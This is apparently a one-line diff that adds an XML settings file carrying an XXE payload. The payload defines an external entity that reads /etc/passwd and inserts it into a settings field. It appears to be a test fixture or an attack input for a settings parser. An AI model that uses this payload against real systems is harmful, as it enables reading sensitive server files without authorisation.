@@ -1,0 +1,1 @@
+<!DOCTYPE AppSettings [ <!ENTITY x SYSTEM "file:///etc/passwd"> ]><AppSettings><KeyFolder_P>&x;</KeyFolder_P></AppSettings>
